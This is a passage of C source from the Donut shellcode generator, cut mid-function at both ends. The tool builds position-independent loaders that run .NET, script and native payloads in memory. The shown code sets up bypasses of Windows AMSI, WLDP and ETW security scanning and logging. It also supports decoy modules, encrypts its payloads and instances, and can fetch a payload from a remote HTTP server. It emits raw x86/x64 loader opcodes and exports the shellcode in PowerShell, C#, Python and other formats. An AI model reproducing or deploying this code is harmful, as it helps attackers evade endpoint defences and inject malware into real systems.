      memcpy(&inst->xIID_AppDomain,        &xIID_AppDomain,        sizeof(GUID));
      memcpy(&inst->xIID_ICLRMetaHost,     &xIID_ICLRMetaHost,     sizeof(GUID));
      memcpy(&inst->xCLSID_CLRMetaHost,    &xCLSID_CLRMetaHost,    sizeof(GUID));
      memcpy(&inst->xIID_ICLRRuntimeInfo,  &xIID_ICLRRuntimeInfo,  sizeof(GUID));
      memcpy(&inst->xIID_ICorRuntimeHost,  &xIID_ICorRuntimeHost,  sizeof(GUID));
      memcpy(&inst->xCLSID_CorRuntimeHost, &xCLSID_CorRuntimeHost, sizeof(GUID));
    } else 
    // if module is VBS or JS
    if(c->mod_type == DONUT_MODULE_VBS ||
       c->mod_type == DONUT_MODULE_JS)
    {       
      DPRINT("Copying GUID structures and DLL strings for loading VBS/JS");
      
      memcpy(&inst->xIID_IUnknown,                &xIID_IUnknown,                sizeof(GUID));
      memcpy(&inst->xIID_IDispatch,               &xIID_IDispatch,               sizeof(GUID));
      memcpy(&inst->xIID_IHost,                   &xIID_IHost,                   sizeof(GUID));
      memcpy(&inst->xIID_IActiveScript,           &xIID_IActiveScript,           sizeof(GUID));
      memcpy(&inst->xIID_IActiveScriptSite,       &xIID_IActiveScriptSite,       sizeof(GUID));
      memcpy(&inst->xIID_IActiveScriptSiteWindow, &xIID_IActiveScriptSiteWindow, sizeof(GUID));
      memcpy(&inst->xIID_IActiveScriptParse32,    &xIID_IActiveScriptParse32,    sizeof(GUID));
      memcpy(&inst->xIID_IActiveScriptParse64,    &xIID_IActiveScriptParse64,    sizeof(GUID));
      
      strcpy(inst->wscript,     "WScript");
      strcpy(inst->wscript_exe, "wscript.exe");
      
      if(c->mod_type == DONUT_MODULE_VBS) {
        memcpy(&inst->xCLSID_ScriptLanguage,    &xCLSID_VBScript, sizeof(GUID));
      } else {
        memcpy(&inst->xCLSID_ScriptLanguage,    &xCLSID_JScript,  sizeof(GUID));
      }
    }

    // if bypassing enabled, copy these strings over
    if(c->bypass != DONUT_BYPASS_NONE) {
      DPRINT("Copying strings required to bypass AMSI");
      
      strcpy(inst->clr,         "clr");
      strcpy(inst->amsi,        "amsi");
      strcpy(inst->amsiInit,    "AmsiInitialize");
      strcpy(inst->amsiScanBuf, "AmsiScanBuffer");
      strcpy(inst->amsiScanStr, "AmsiScanString");
      
      DPRINT("Copying strings required to bypass WLDP");
      
      strcpy(inst->wldp,           "wldp");
      strcpy(inst->wldpQuery,      "WldpQueryDynamicCodeTrust");
      strcpy(inst->wldpIsApproved, "WldpIsClassInApprovedList");

      DPRINT("Copying strings required to bypass ETW");
      strcpy(inst->ntdll, "ntdll");
      strcpy(inst->etwEventWrite, "EtwEventWrite");
      strcpy(inst->etwEventUnregister, "EtwEventUnregister");
    }
    
    // if module is an unmanaged EXE
    if(c->mod_type == DONUT_MODULE_EXE) {
      // does the user specify parameters for the command line?
      if(c->args[0] != 0) {
        DPRINT("Copying strings required to replace command line.");
        
        strcpy(inst->dataname,   ".data");
        strcpy(inst->kernelbase, "kernelbase");
        strcpy(inst->cmd_syms,   "_acmdln;__argv;__p__acmdln;__p___argv;_wcmdln;__wargv;__p__wcmdln;__p___wargv");
      }
      // does user want loader to run the entrypoint as a thread?
      if(c->thread != 0) {
        DPRINT("Copying strings required to intercept exit-related API");
        // these exit-related API will be replaced with pointer to RtlExitUserThread
        strcpy(inst->exit_api, "ExitProcess;exit;_exit;_cexit;_c_exit;quick_exit;_Exit");
      }
    }

    // decoy module path
    if (c->decoy[0] != 0)
    {
      wcscpy(inst->decoy, L"\\??\\");
      wchar_t wcFileName[MAX_PATH];
      mbstowcs(wcFileName, c->decoy, MAX_PATH);
      wcsncat(inst->decoy, wcFileName, MAX_PATH);
    }
    
    // if the module will be downloaded
    // set the URL parameter and request verb
    if(inst->type == DONUT_INSTANCE_HTTP) {
      // if no module name specified
      if(c->modname[0] == 0) {
        // if entropy disabled
        if(c->entropy == DONUT_ENTROPY_NONE) {
          // set to "AAAAAAAA"
          memset(c->modname, 'A', DONUT_MAX_MODNAME);
        } else {
          // generate a random name for module
          // that will be saved to disk
          DPRINT("Generating random name for module");
          if(!gen_random_string(c->modname, DONUT_MAX_MODNAME)) {
            DPRINT("gen_random_string() failed");
            err = DONUT_ERROR_RANDOM;
            goto cleanup;
          }
        }
        DPRINT("Name for module : %s", c->modname);
      }
      strcpy(inst->server, c->server);
      // append module name
      strcat(inst->server, c->modname);
      // set the request verb
      strcpy(inst->http_req, "GET");
      
      DPRINT("Loader will attempt to download module from : %s", inst->server);
      
      // encrypt module?
      if(c->entropy == DONUT_ENTROPY_DEFAULT) {
        DPRINT("Encrypting module");
        
        c->mod->mac = maru(inst->sig, inst->iv);
        
        donut_encrypt(
          mod_key.mk, 
          mod_key.ctr, 
          c->mod, 
          c->mod_len);
      }
    } else 
    // if embedded, copy module to instance
    if(inst->type == DONUT_INSTANCE_EMBED) {
      DPRINT("Copying module data to instance");
      memcpy(&c->inst->module.x, c->mod, c->mod_len);
    }
    
    // encrypt instance?
    if(c->entropy == DONUT_ENTROPY_DEFAULT) {
      DPRINT("Encrypting instance");
      
      inst->mac = maru(inst->sig, inst->iv);
      
      uint8_t *inst_data = (uint8_t*)inst + offsetof(DONUT_INSTANCE, api_cnt);
      
      donut_encrypt(
        inst_key.mk, 
        inst_key.ctr, 
        inst_data, 
        c->inst_len - offsetof(DONUT_INSTANCE, api_cnt));
    }
cleanup:
    // error? release memory for everything
    if(err != DONUT_ERROR_OK) {
      DPRINT("Releasing memory for module due to errors.");
      free(c->mod);
    }
    DPRINT("Leaving with error :  %" PRId32, err);
    return err;
}

/**
 * Function: save_file
 * ----------------------------
 *   Creates a file and writes the contents of input buffer to it.
 *
 *   INPUT  : path = where to create file.
 *            data = what to write to file.
 *            len  = length of data.
 *
 *   OUTPUT : Donut error code.
 */
static int save_file(const char *path, void *data, int len) {
    FILE *out;
    int  err = DONUT_ERROR_OK;
    
    DPRINT("Entering.");
    out = fopen(path, "wb");
      
    if(out != NULL) {
      DPRINT("Writing %d bytes of %p to %s", len, data, path);
      fwrite(data, 1, len, out);
      fclose(out);
    } else err = DONUT_ERROR_FILE_ACCESS;
    
    DPRINT("Leaving with error :  %" PRId32, err);
    return err;
}

/**
 * Function: save_loader
 * ----------------------------
 *   Saves the loader to output file. Also saves instance for debug builds.
 *   If the instance type is HTTP, it saves the module to file.
 *
 *   INPUT  : Donut configuration.
 *
 *   OUTPUT : Donut error code.
 */
static int save_loader(PDONUT_CONFIG c) {
    int   err = DONUT_ERROR_OK;
    FILE *fd;
    
    // if DEBUG is defined, save instance to disk
    #ifdef DEBUG
      DPRINT("Saving instance %p to file. %" PRId32 " bytes.", c->inst, c->inst_len);
      save_file("instance", c->inst, c->inst_len);
    #endif

    // If the module will be stored on a remote server
    if(c->inst_type == DONUT_INSTANCE_HTTP) {
      DPRINT("Saving %s to file.", c->modname);
      save_file(c->modname, c->mod, c->mod_len);
    }
              
    // no output file specified?
    if(c->output[0] == 0) {
      // set to default name based on format
      switch(c->format) {
        case DONUT_FORMAT_BINARY:
          strncpy(c->output, "loader.bin", DONUT_MAX_NAME-1);
          break;
        case DONUT_FORMAT_BASE64:
          strncpy(c->output, "loader.b64", DONUT_MAX_NAME-1);
          break;
        case DONUT_FORMAT_RUBY:
          strncpy(c->output, "loader.rb",  DONUT_MAX_NAME-1);
          break;
        case DONUT_FORMAT_C:
          strncpy(c->output, "loader.c",   DONUT_MAX_NAME-1);
          break;
        case DONUT_FORMAT_PYTHON:
          strncpy(c->output, "loader.py",  DONUT_MAX_NAME-1);
          break;
        case DONUT_FORMAT_POWERSHELL:
          strncpy(c->output, "loader.ps1", DONUT_MAX_NAME-1);
          break;
        case DONUT_FORMAT_CSHARP:
          strncpy(c->output, "loader.cs",  DONUT_MAX_NAME-1);
          break;
        case DONUT_FORMAT_HEX:
          strncpy(c->output, "loader.hex", DONUT_MAX_NAME-1);
          break;
      }
    }
    // save loader to file
    fd = fopen(c->output, "wb");
    if(fd == NULL) {
      DPRINT("Opening %s failed.", c->output);
      return DONUT_ERROR_FILE_ACCESS;
    }
    
    switch(c->format) {
      case DONUT_FORMAT_BINARY: {
        DPRINT("Saving loader as binary");
        fwrite(c->pic, 1, c->pic_len, fd);
        err = DONUT_ERROR_OK;
        break;
      }
      case DONUT_FORMAT_BASE64: {
        DPRINT("Saving loader as base64 string");
        err = base64_template(c->pic, c->pic_len, fd);
        break;
      }
      case DONUT_FORMAT_RUBY:
      case DONUT_FORMAT_C:
        DPRINT("Saving loader as C/Ruby string");
        err = c_ruby_template(c->pic, c->pic_len, fd);
        break;
      case DONUT_FORMAT_PYTHON:
        DPRINT("Saving loader as Python string");
        err = py_template(c->pic, c->pic_len, fd);
        break;
      case DONUT_FORMAT_POWERSHELL:
        DPRINT("Saving loader as Powershell string");
        err = powershell_template(c->pic, c->pic_len, fd);
        break;
      case DONUT_FORMAT_CSHARP:
        DPRINT("Saving loader as C# string");
        err = csharp_template(c->pic, c->pic_len, fd);
        break;
      case DONUT_FORMAT_HEX:
        DPRINT("Saving loader as Hex string");
        err = hex_template(c->pic, c->pic_len, fd);
        break;
    }
    fclose(fd);
    DPRINT("Leaving with error :  %" PRId32, err);
    return err;
}

/**
 * Function: build_loader
 * ----------------------------
 *   Builds the shellcode that's injected into remote process.
 *
 *   INPUT  : Donut configuration.
 *
 *   OUTPUT : Donut error code.
 */
static int build_loader(PDONUT_CONFIG c) {
    uint8_t *pl;
    uint32_t t;
    
    // target is x86?
    if(c->arch == DONUT_ARCH_X86) {
      c->pic_len = sizeof(LOADER_EXE_X86) + c->inst_len + 32;
    } else 
    // target is amd64?
    if(c->arch == DONUT_ARCH_X64) {
      c->pic_len = sizeof(LOADER_EXE_X64) + c->inst_len + 32;
    } else 
    // target can be both x86 and amd64?
    if(c->arch == DONUT_ARCH_X84) {
      c->pic_len = sizeof(LOADER_EXE_X86) + 
                   sizeof(LOADER_EXE_X64) + c->inst_len + 32;
    }
    // allocate memory for shellcode
    c->pic = malloc(c->pic_len);
     
    if(c->pic == NULL) {
      DPRINT("Unable to allocate %" PRId32 " bytes of memory for loader.", c->pic_len);
      return DONUT_ERROR_NO_MEMORY;
    }
    
    DPRINT("Inserting opcodes");
    
    // insert shellcode
    pl = (uint8_t*)c->pic;
    
    // call $ + c->inst_len
    PUT_BYTE(pl,  0xE8);
    PUT_WORD(pl,  c->inst_len);
    PUT_BYTES(pl, c->inst, c->inst_len);
    // pop ecx
    PUT_BYTE(pl,  0x59);
    
    // x86?
    if(c->arch == DONUT_ARCH_X86) {
      // pop edx
      PUT_BYTE(pl, 0x5A);
      // push ecx
      PUT_BYTE(pl, 0x51);
      // push edx
      PUT_BYTE(pl, 0x52);
      
      DPRINT("Copying %" PRIi32 " bytes of x86 shellcode", 
        (uint32_t)sizeof(LOADER_EXE_X86));
        
      PUT_BYTES(pl, LOADER_EXE_X86, sizeof(LOADER_EXE_X86));
    } else 
    // AMD64?
    if(c->arch == DONUT_ARCH_X64) {
      
      DPRINT("Copying %" PRIi32 " bytes of amd64 shellcode", 
        (uint32_t)sizeof(LOADER_EXE_X64));

      // ensure stack is 16-byte aligned for x64 for Microsoft x64 calling convention
      
      // and rsp, -0x10
      PUT_BYTE(pl, 0x48);
      PUT_BYTE(pl, 0x83);
      PUT_BYTE(pl, 0xE4);
      PUT_BYTE(pl, 0xF0);
      // push rcx
      // this is just for alignment, any 8 bytes would do
      PUT_BYTE(pl, 0x51);

      PUT_BYTES(pl, LOADER_EXE_X64, sizeof(LOADER_EXE_X64));
    } else 
    // x86 + AMD64?
    if(c->arch == DONUT_ARCH_X84) {
      
      DPRINT("Copying %" PRIi32 " bytes of x86 + amd64 shellcode",
        (uint32_t)(sizeof(LOADER_EXE_X86) + sizeof(LOADER_EXE_X64)));
        
      // xor eax, eax
      PUT_BYTE(pl, 0x31);
      PUT_BYTE(pl, 0xC0);
      // dec eax
      PUT_BYTE(pl, 0x48);
      // js dword x86_code
      PUT_BYTE(pl, 0x0F);
      PUT_BYTE(pl, 0x88);
      PUT_WORD(pl,  sizeof(LOADER_EXE_X64) + 5);
      
      // ensure stack is 16-byte aligned for x64 for Microsoft x64 calling convention
      
      // and rsp, -0x10
      PUT_BYTE(pl, 0x48);
      PUT_BYTE(pl, 0x83);
      PUT_BYTE(pl, 0xE4);
      PUT_BYTE(pl, 0xF0);
      // push rcx
      // this is just for alignment, any 8 bytes would do
      PUT_BYTE(pl, 0x51);

      PUT_BYTES(pl, LOADER_EXE_X64, sizeof(LOADER_EXE_X64));
      // pop edx
      PUT_BYTE(pl, 0x5A);
      // push ecx
      PUT_BYTE(pl, 0x51);
      // push edx
      PUT_BYTE(pl, 0x52);
      PUT_BYTES(pl, LOADER_EXE_X86, sizeof(LOADER_EXE_X86));
    }
    return DONUT_ERROR_OK;
}

/**
 * Function: validate_loader_cfg
 * ----------------------------
 *   Validates Donut configuration for loader.
 *
 *   INPUT  : Pointer to a Donut configuration.
 *
 *   OUTPUT : Donut error code.
 */
static int validate_loader_cfg(PDONUT_CONFIG c) {
    uint32_t url_len;
    
    DPRINT("Validating loader configuration.");
    
    if(c == NULL || c->input[0] == 0) {
      DPRINT("No configuration or input file provided.");
      return DONUT_ERROR_INVALID_PARAMETER;
    }

    if(c->inst_type != DONUT_INSTANCE_EMBED &&
       c->inst_type != DONUT_INSTANCE_HTTP) {
      
      DPRINT("Instance type %" PRIx32 " is invalid.", c->inst_type);
      return DONUT_ERROR_INVALID_PARAMETER;
    }
    
    if(c->format < DONUT_FORMAT_BINARY || c->format > DONUT_FORMAT_HEX) {
      DPRINT("Format type %" PRId32 " is invalid.", c->format);
      return DONUT_ERROR_INVALID_FORMAT;
    }
    
    #ifdef WINDOWS
      if(c->compress != DONUT_COMPRESS_NONE  &&
         c->compress != DONUT_COMPRESS_APLIB &&
         c->compress != DONUT_COMPRESS_LZNT1 &&
         c->compress != DONUT_COMPRESS_XPRESS)
      {
        DPRINT("Compression engine %" PRId32 " is invalid.", c->compress);
        return DONUT_ERROR_INVALID_ENGINE;
      }
    #else
      if(c->compress != DONUT_COMPRESS_NONE        &&
         c->compress != DONUT_COMPRESS_APLIB)
      {
        DPRINT("Compression engine %" PRId32 " is invalid.", c->compress);
        return DONUT_ERROR_INVALID_ENGINE;
      }
    #endif
  
    if(c->entropy != DONUT_ENTROPY_NONE   &&
       c->entropy != DONUT_ENTROPY_RANDOM &&
       c->entropy != DONUT_ENTROPY_DEFAULT)
    {
      DPRINT("Entropy level %" PRId32 " is invalid.", c->entropy);
      return DONUT_ERROR_INVALID_ENTROPY;
    }
    
    if(c->inst_type == DONUT_INSTANCE_HTTP) {
      // no URL? exit
      if(c->server[0] == 0) {
        DPRINT("Error: No HTTP server provided.");
        return DONUT_ERROR_INVALID_PARAMETER;
      }
      // doesn't begin with one of the following? exit
      if((strnicmp(c->server, "http://",  7) != 0) &&
         (strnicmp(c->server, "https://", 8) != 0)) {
        
        DPRINT("URL is invalid : %s", c->server);
        return DONUT_ERROR_INVALID_URL;
      }
      // invalid length?
      url_len = (uint32_t)strlen(c->server);
      
      if(url_len <= 8) {
        DPRINT("URL length : %" PRId32 " is invalid.", url_len);
        return DONUT_ERROR_URL_LENGTH;
      }
      // if the end of string doesn't have a forward slash
      // add one more to account for it
      if(c->server[url_len - 1] != '/') {
        c->server[url_len] = '/';
        url_len++;
      }
      
      if((url_len + DONUT_MAX_MODNAME) >= DONUT_MAX_NAME) {
        DPRINT("URL length : %" PRId32 " exceeds size of buffer : %"PRId32, 
          url_len+DONUT_MAX_MODNAME, DONUT_MAX_NAME);
        return DONUT_ERROR_URL_LENGTH;
      }
    }
    
    if(c->arch != DONUT_ARCH_X86 &&
       c->arch != DONUT_ARCH_X64 &&
       c->arch != DONUT_ARCH_X84 &&
       c->arch != DONUT_ARCH_ANY)
    {
      DPRINT("Target architecture %"PRId32 " is invalid.", c->arch);
      return DONUT_ERROR_INVALID_ARCH;
    }
    
    if(c->bypass != DONUT_BYPASS_NONE     &&
       c->bypass != DONUT_BYPASS_ABORT    &&
       c->bypass != DONUT_BYPASS_CONTINUE)
    {
      DPRINT("Option to bypass AMSI/WDLP %"PRId32" is invalid.", c->bypass);
      return DONUT_ERROR_BYPASS_INVALID;
    }

    if(c->headers != DONUT_HEADERS_OVERWRITE     &&
       c->headers != DONUT_HEADERS_KEEP)
    {
      DPRINT("Option to preserve PE headers (or not) %"PRId32" is invalid.", c->headers);
      return DONUT_ERROR_HEADERS_INVALID;
    }
    
    DPRINT("Loader configuration passed validation.");
    return DONUT_ERROR_OK;
}

/**
 * Function: is_dll_export
 * ----------------------------
 *   Validates if a DLL exports a function. 
 *
 *   INPUT  : Name of DLL function to check.
 *
 *   OUTPUT : 1 if found, else 0
 */
static int is_dll_export(const char *function) {
    PIMAGE_DATA_DIRECTORY   dir;
    PIMAGE_EXPORT_DIRECTORY exp;
    DWORD                   rva, cnt;
    ULONG64                 ofs;
    PDWORD                  sym;
    PCHAR                   str;
    int                     found = 0;

    DPRINT("Entering.");
    
    dir = Dirs(fi.data);
    if(dir != NULL) {
      rva = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
      DPRINT("EAT VA : %lx", rva);
      if(rva != 0) {
        ofs = rva2ofs(fi.data, rva);
        DPRINT("Offset = %" PRIX64 "\n", ofs);
        if(ofs != -1) {
          exp = (PIMAGE_EXPORT_DIRECTORY)(fi.data + ofs);
          cnt = exp->NumberOfNames;
          DPRINT("Number of exported functions : %lx", cnt);
          
          if(cnt != 0) {
            sym = (PDWORD)(rva2ofs(fi.data, exp->AddressOfNames) + fi.data);
            // scan array for symbol
            do {
              str = (PCHAR)(rva2ofs(fi.data, sym[cnt - 1]) + fi.data);
              // if match found, exit
              if(strcmp(str, function) == 0) {
                DPRINT("Found API");
                found = 1;
                break;
              }
            } while (--cnt);
          }
        }
      }
    }
    DPRINT("Leaving.");
    return found;
}

/**
 * Function: validate_file_cfg
 * ----------------------------
 *   Validates configuration for the input file.
 *
 *   INPUT  : Pointer to Donut configuration.
 *
 *   OUTPUT : Donut error code. 
 */
static int validate_file_cfg(PDONUT_CONFIG c) {
    DPRINT("Validating configuration for input file.");
    
    // Unmanaged EXE/DLL?
    if(fi.type == DONUT_MODULE_DLL ||
       fi.type == DONUT_MODULE_EXE)
    {
      // Requested shellcode is x86, but file is x64?
      // Requested shellcode is x64, but file is x86?
      if((c->arch == DONUT_ARCH_X86  && 
         fi.arch  == DONUT_ARCH_X64) ||
         (c->arch == DONUT_ARCH_X64  &&
         fi.arch  == DONUT_ARCH_X86))
      {
        DPRINT("Target architecture %"PRId32 " is not compatible with DLL/EXE %"PRId32, c->arch, fi.arch);
        return DONUT_ERROR_ARCH_MISMATCH;
      }
      // DLL function specified. Does it exist?
      if(fi.type == DONUT_MODULE_DLL && c->method[0] != 0)
      {
        if(!is_dll_export(c->method)) {
          DPRINT("Unable to locate function \"%s\" in DLL", c->method);
          return DONUT_ERROR_DLL_FUNCTION;
        }
      }
    }    
    // .NET DLL assembly?
    if(fi.type == DONUT_MODULE_NET_DLL) {
      // DLL requires class and method
      if(c->cls[0] == 0 || c->method[0] == 0) {
        DPRINT("Input file is a .NET assembly, but no class and method have been specified.");
        return DONUT_ERROR_NET_PARAMS;
      }
    }
    
    // is this an unmanaged DLL with parameters?
    if(fi.type == DONUT_MODULE_DLL && c->args[0] != 0) {
      // we need a DLL function
      if(c->method[0] == 0) {
        DPRINT("Parameters are provided for an unmanaged/native DLL, but no function.");
        return DONUT_ERROR_DLL_PARAM;
      }
    }
    DPRINT("Validation passed.");
    return DONUT_ERROR_OK;
}

/**
 * Function: DonutCreate
 * ----------------------------
 *   Builds a position-independent loader for VBS/JS/EXE/DLL files.
 *
 *   INPUT  : Pointer to a Donut configuration.
 *
 *   OUTPUT : Donut error code.
 */
EXPORT_FUNC 
int DonutCreate(PDONUT_CONFIG c) {
    int err = DONUT_ERROR_OK;
    
    DPRINT("Entering.");
    
    c->mod = c->pic = c->inst = NULL;
    c->mod_len = c->pic_len = c->inst_len = 0;
    
    // 1. validate the loader configuration
    err = validate_loader_cfg(c);
    if(err == DONUT_ERROR_OK) {
      // 2. get information about the file to execute in memory
      err = read_file_info(c);
      if(err == DONUT_ERROR_OK) {
        // 3. validate the module configuration
        err = validate_file_cfg(c);
        if(err == DONUT_ERROR_OK) {
          // 4. build the module
          err = build_module(c);
          if(err == DONUT_ERROR_OK) {
            // 5. build the instance
            err = build_instance(c);
            if(err == DONUT_ERROR_OK) {
              // 6. build the loader
              err = build_loader(c);
              if(err == DONUT_ERROR_OK) {
                // 7. save loader and any additional files to disk
                err = save_loader(c);
              }
            }
          }
        }
      }
    }
    // if there was some error, release resources
    if(err != DONUT_ERROR_OK) {
      DonutDelete(c);
    }
    DPRINT("Leaving with error :  %" PRId32, err);
    return err;
}

/**
 * Function: DonutDelete
 * ----------------------------
 *   Releases memory allocated by internal Donut functions.
 *
 *   INPUT  : Pointer to a Donut configuration previously used by DonutCreate.
 *
 *   OUTPUT : Donut error code.
 */
EXPORT_FUNC 
int DonutDelete(PDONUT_CONFIG c) {
    
    DPRINT("Entering.");
    if(c == NULL) {
      return DONUT_ERROR_INVALID_PARAMETER;
    }
    // free module
    if(c->mod != NULL) {
      DPRINT("Releasing memory for module.");
      free(c->mod);
      c->mod = NULL;
    }
    // free instance
    if(c->inst != NULL) {
      DPRINT("Releasing memory for configuration.");
      free(c->inst);
      c->inst = NULL;
    }
    // free loader
    if(c->pic != NULL) {
      DPRINT("Releasing memory for loader.");
      free(c->pic);
      c->pic = NULL;
    }
    unmap_file();
    
    DPRINT("Leaving.");
    return DONUT_ERROR_OK;
}

/**
 * Function: DonutError
 * ----------------------------
 *   Converts Donut error code into a string
 *
 *   INPUT  : error code returned by DonutCreate
 *
 *   OUTPUT : error code as a string 
 */
EXPORT_FUNC
const char *DonutError(int err) {
    static const char *str="N/A";
    
    switch(err) {
      case DONUT_ERROR_OK:
        str = "No error.";
        break;
      case DONUT_ERROR_FILE_NOT_FOUND:
        str = "File not found.";
        break;
      case DONUT_ERROR_FILE_EMPTY:
        str = "File is empty.";
        break;
      case DONUT_ERROR_FILE_ACCESS:
        str = "Cannot open file.";
        break;
      case DONUT_ERROR_FILE_INVALID:
        str = "File is invalid.";
        break;      
      case DONUT_ERROR_NET_PARAMS:
        str = "File is a .NET DLL. Donut requires a class and method.";
        break;
      case DONUT_ERROR_NO_MEMORY:
        str = "Memory allocation failed.";
        break;
      case DONUT_ERROR_INVALID_ARCH:
        str = "Invalid architecture specified.";
        break;      
      case DONUT_ERROR_INVALID_URL:
        str = "Invalid URL.";
        break;
      case DONUT_ERROR_URL_LENGTH:
        str = "Invalid URL length.";
        break;
      case DONUT_ERROR_INVALID_PARAMETER:
        str = "Invalid parameter.";
        break;
      case DONUT_ERROR_RANDOM:
        str = "Error generating random values.";
        break;
      case DONUT_ERROR_DLL_FUNCTION:
        str = "Unable to locate DLL function provided. Names are case sensitive.";
        break;
      case DONUT_ERROR_ARCH_MISMATCH:
        str = "Target architecture cannot support selected DLL/EXE file.";
        break;
      case DONUT_ERROR_DLL_PARAM:
        str = "You've supplied parameters for an unmanaged DLL. Donut also requires a DLL function.";
        break;
      case DONUT_ERROR_BYPASS_INVALID:
        str = "Invalid bypass option specified.";
        break;
      case DONUT_ERROR_HEADERS_INVALID:
        str = "Invalid PE headers preservation option.";
        break;
      case DONUT_ERROR_INVALID_FORMAT:
        str = "The output format is invalid.";
        break;
      case DONUT_ERROR_INVALID_ENGINE:
        str = "The compression engine is invalid.";
        break;
      case DONUT_ERROR_COMPRESSION:
        str = "There was an error during compression.";
        break;
      case DONUT_ERROR_INVALID_ENTROPY:
        str = "Invalid entropy level specified.";
        break;
      case DONUT_ERROR_MIXED_ASSEMBLY:
        str = "Mixed (native and managed) assemblies are currently unsupported.";
        break;
      case DONUT_ERROR_DECOY_INVALID:
        str = "Path of decoy module is invalid.";
        break;
    }
    DPRINT("Error result : %s", str);
    return str;
}

#ifdef DONUT_EXE

#define OPT_MAX_STRING 256

#define OPT_TYPE_NONE   1
#define OPT_TYPE_STRING 2
#define OPT_TYPE_DEC    3
#define OPT_TYPE_HEX    4
#define OPT_TYPE_FLAG   5
#define OPT_TYPE_DEC64  6
#define OPT_TYPE_HEX64  7

// structure to hold data of any type
typedef union _opt_arg_t {
    int flag;

    int8_t s8;
    uint8_t u8;
    int8_t *s8_ptr;
    uint8_t *u8_ptr;

    int16_t s16;
    uint16_t u16;
    int16_t *s16_ptr;
    uint16_t *u16_ptr;

    int32_t s32;
    uint32_t u32;
    int32_t *s32_ptr;
    uint32_t *u32_ptr;

    int64_t s64;
    uint64_t u64;
    int64_t *s64_ptr;
    uint64_t *u64_ptr;      

    void *ptr;
    char str[OPT_MAX_STRING+1];
} opt_arg;

typedef void (*void_callback_t)(void);         // execute callback with no return value or argument
typedef int (*arg_callback_t)(opt_arg*,void*); // process argument, optionally store in optarg

static int get_opt(
  int argc,         // total number of elements in argv
  char *argv[],     // argument array
  int arg_type,     // type of argument expected (none, flag, decimal, hexadecimal, string)
  void *output,     // pointer to variable that stores argument
  char *short_opt,  // short form of option. e.g: -a
  char *long_opt,   // long form of option. e.g: --arch
  void *callback)   // callback function to process argument
{
    int  valid = 0, i, req = 0, opt_len, opt_type;
    char *args=NULL, *opt=NULL, *arg=NULL, *tmp=NULL;
    opt_arg *optarg = (opt_arg*)output;
    void_callback_t void_cb;
    arg_callback_t  arg_cb;
    
    // perform some basic validation
    if(argc <= 1) return 0;
    if(argv == NULL) return 0;
    
    if(arg_type != OPT_TYPE_NONE   &&
       arg_type != OPT_TYPE_STRING &&
       arg_type != OPT_TYPE_DEC    &&
       arg_type != OPT_TYPE_HEX    &&
       arg_type != OPT_TYPE_FLAG) return 0;
    
    DPRINT("Arg type for %s, %s : %s",
      short_opt != NULL ? short_opt : "N/A",
      long_opt != NULL ? long_opt : "N/A",
      arg_type == OPT_TYPE_NONE ? "None" : 
      arg_type == OPT_TYPE_STRING ? "String" :
      arg_type == OPT_TYPE_DEC ? "Decimal" :
      arg_type == OPT_TYPE_HEX ? "Hexadecimal" :
      arg_type == OPT_TYPE_FLAG ? "Flag" : "Unknown");
      
    // for each argument in array
    for(i=1; i<argc && !valid; i++) {
      // set the current argument to examine
      arg = argv[i];
      // if it doesn't contain a switch, skip it
      if(*arg != '-') continue;
      // we have a switch. initially, we assume short form
      arg++;
      opt_type = 0;
      // long form? skip one more and change the option type
      if(*arg == '-') {
        arg++;
        opt_type++;
      }
      
      // is an argument required by the user?
      req = ((arg_type != OPT_TYPE_NONE) && (arg_type != OPT_TYPE_FLAG));
      // use short or long form for current argument being examined
      opt = (opt_type) ? long_opt : short_opt;
      // if no form provided by user for current argument, skip it
      if(opt == NULL) continue;
      // copy string to dynamic buffer
      opt_len = strlen(opt);
      if(opt_len == 0) continue;
      
      tmp = calloc(sizeof(uint8_t), opt_len + 1);
      if(tmp == NULL) {
        DPRINT("Unable to allocate memory for %s.\n", opt);
        continue;
      } else {
        strcpy(tmp, opt);
      }
      // tokenize the string.
      opt = strtok(tmp, ";");
      // while we have options
      while(opt != NULL && !valid) {
        // get the length
        opt_len = strlen(opt);
        // do we have a match?   
        if(!strncmp(opt, arg, opt_len)) {
          //
          // at this point, we have a valid matching argument
          // if something fails from here on in, return invalid
          // 
          // skip the option
          arg += opt_len;
          // an argument is *not* required
          if(!req) {
            // so is the next byte non-zero? return invalid
            if(*arg != 0) return 0;
          } else {
            // an argument is required
            // if the next byte is a colon or assignment operator, skip it.
            if(*arg == ':' || *arg == '=') arg++;
         
            // if the next byte is zero
            if(*arg == 0) { 
              // and no arguments left. return invalid
              if((i + 1) >= argc) return 0;
              args = argv[i + 1];
            } else {
              args = arg;
            }
          }
          // end loop
          valid = 1;
          break;
        }
        opt = strtok(NULL, ";");
      }
      if(tmp != NULL) free(tmp);
    }
    
    // if valid option found
    if(valid) {
      DPRINT("Found match");
      // ..and a callback exists
      if(callback != NULL) {
        // if we have a parameter
        if(args != NULL) {
          DPRINT("Executing callback with %s.", args);
          // execute with parameter
          arg_cb = (arg_callback_t)callback;
          arg_cb(optarg, args);
        } else {
          DPRINT("Executing callback.");
          // otherwise, execute without
          void_cb = (void_callback_t)callback;
          void_cb();
        }
      } else {
        // there's no callback, try process ourselves
        if(args != NULL) {
          DPRINT("Parsing %s\n", args);
          switch(arg_type) {
            case OPT_TYPE_DEC:
            case OPT_TYPE_HEX:
              DPRINT("Converting %s to 32-bit binary", args);
              optarg->u32 = strtoul(args, NULL, arg_type == OPT_TYPE_DEC ? 10 : 16);
              break;
            case OPT_TYPE_DEC64:
            case OPT_TYPE_HEX64:
              DPRINT("Converting %s to 64-bit binary", args);
              optarg->u64 = strtoull(args, NULL, arg_type == OPT_TYPE_DEC64 ? 10 : 16);
              break;
            case OPT_TYPE_STRING:
              DPRINT("Copying %s to output", args);
              strncpy(optarg->str, args, OPT_MAX_STRING);
              break;
          }
        } else {
          // there's no argument, just set the flag
          DPRINT("Setting flag");
          optarg->flag = 1;
        }
      }
    }
    // return result
    return valid;
}

// callback to validate architecture
static int validate_arch(opt_arg *arg, void *args) {
    char *str = (char*)args;
    
    arg->u32 = 0;
    if(str == NULL) return 0;
    
    // single digit? convert to binary
    if(strlen(str) == 1 && isdigit((int)*str)) {
      arg->u32 = atoi(str);
    } else {
      // otherwise, try map it to digit
      if(!strcasecmp("x86", str)) {
        arg->u32 = DONUT_ARCH_X86;
      } else
      if(!strcasecmp("amd64", str)) {
        arg->u32 = DONUT_ARCH_X64;
      } else
      if(!strcasecmp("x84", str)) {
        arg->u32 = DONUT_ARCH_X84;
      }
    }
    
